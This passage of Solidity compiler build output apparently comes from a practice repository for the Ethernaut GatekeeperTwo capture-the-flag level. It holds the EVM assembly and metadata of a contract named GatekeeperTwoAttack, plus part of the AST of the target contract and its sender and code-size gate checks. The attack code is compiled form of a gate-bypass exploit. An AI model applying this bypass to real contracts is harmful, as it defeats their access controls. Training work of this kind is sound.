								},
								{
									"begin": 537,
									"end": 549,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 537,
									"end": 549,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 537,
									"end": 549,
									"name": "PUSH",
									"source": 1,
									"value": "3370204E"
								},
								{
									"begin": 550,
									"end": 557,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFF"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "E0"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SHL",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "4"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP8",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "EXTCODESIZE",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "GAS",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "CALL",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "7"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 45,
									"end": 61,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 42,
									"end": 43,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 39,
									"end": 40,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 24,
									"end": 62,
									"name": "RETURNDATACOPY",
									"source": -1
								},
								{
									"begin": 77,
									"end": 93,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 74,
									"end": 75,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 67,
									"end": 94,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"source": -1,
									"value": "7"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "RETURNDATASIZE",
									"source": 1
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 537,
									"end": 558,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 528,
									"end": 534,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 528,
									"end": 534,
									"name": "PUSH",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 528,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 528,
									"end": 558,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "PUSH",
									"source": 1,
									"value": "FF"
								},
								{
									"begin": 528,
									"end": 558,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 528,
									"end": 558,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220f5a9fb561acf16dd7f28698cfcbd627463a35de96a4df72e08963baf1e2f11d864736f6c63430006060033",
									".code": [
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH",
											"source": 1,
											"value": "65372147"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 88,
											"end": 567,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 88,
											"end": 567,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "PUSH",
											"source": 1,
											"value": "FF"
										},
										{
											"begin": 149,
											"end": 167,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 149,
											"end": 167,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"result()": "65372147"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"result\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":\"GatekeeperTwoAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":{\"keccak256\":\"0xf3d0f0add933fce084be65de3e3f2d809ddd0e0380fa6a688e7e2b8b522acc99\",\"urls\":[\"bzz-raw://99a046d2959f969d0d16bf4b802845f8e5f4b22a934320e239d6f86f6d84355d\",\"dweb:/ipfs/QmPB5yoc4i5Kf5x8JnL8CocxUrqQ85e9NZfXCYbSEAoG4D\"]},\"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":{\"keccak256\":\"0xd1c136e65e9aed5a9081410c8d33751290da41ad6677abfba0f2e9586679cdb7\",\"urls\":[\"bzz-raw://895371db39d0d1003b5d98aeceb4648291c967e28a68bf25be5173d149147866\",\"dweb:/ipfs/QmNUZaGJUWdy6tUCxQTUfr85kqBqAwoYBJ6xPzRrCLF2Nr\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 91,
								"contract": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol:GatekeeperTwoAttack",
								"label": "target",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(GatekeeperTwo)86"
							},
							{
								"astId": 93,
								"contract": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol:GatekeeperTwoAttack",
								"label": "result",
								"offset": 20,
								"slot": "0",
								"type": "t_bool"
							}
						],
						"types": {
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							},
							"t_contract(GatekeeperTwo)86": {
								"encoding": "inplace",
								"label": "contract GatekeeperTwo",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol": {
				"ast": {
					"absolutePath": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol",
					"exportedSymbols": {
						"GatekeeperTwo": [
							86
						]
					},
					"id": 87,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 86,
							"linearizedBaseContracts": [
								86
							],
							"name": "GatekeeperTwo",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "9db31d77",
									"id": 3,
									"mutability": "mutable",
									"name": "entrant",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 86,
									"src": "214:22:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "214:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 14,
										"nodeType": "Block",
										"src": "262:60:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															"id": 10,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 6,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "280:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 7,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "280:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 8,
																	"name": "tx",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -26,
																	"src": "294:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_transaction",
																		"typeString": "tx"
																	}
																},
																"id": 9,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "origin",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "294:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "280:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 5,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "272:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 11,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "272:32:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 12,
												"nodeType": "ExpressionStatement",
												"src": "272:32:0"
											},
											{
												"id": 13,
												"nodeType": "PlaceholderStatement",
												"src": "314:1:0"
											}
										]
									},
									"documentation": null,
									"id": 15,
									"name": "gateOne",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "259:2:0"
									},
									"src": "243:79:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "347:127:0",
										"statements": [
											{
												"assignments": [
													18
												],
												"declarations": [
													{
														"constant": false,
														"id": 18,
														"mutability": "mutable",
														"name": "x",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 28,
														"src": "357:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 17,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "357:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 19,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "357:6:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "382:50:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "396:26:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "caller",
																			"nodeType": "YulIdentifier",
																			"src": "413:6:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "413:8:0"
																	}
																],
																"functionName": {
																	"name": "extcodesize",
																	"nodeType": "YulIdentifier",
																	"src": "401:11:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "401:21:0"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "396:1:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 18,
														"isOffset": false,
														"isSlot": false,
														"src": "396:1:0",
														"valueSize": 1
													}
												],
												"id": 20,
												"nodeType": "InlineAssembly",
												"src": "373:59:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 24,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 22,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 18,
																"src": "449:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 23,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "454:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "449:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 21,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "441:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "441:15:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "441:15:0"
											},
											{
												"id": 27,
												"nodeType": "PlaceholderStatement",
												"src": "466:1:0"
											}
										]
									},
									"documentation": null,
									"id": 29,
									"name": "gateTwo",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
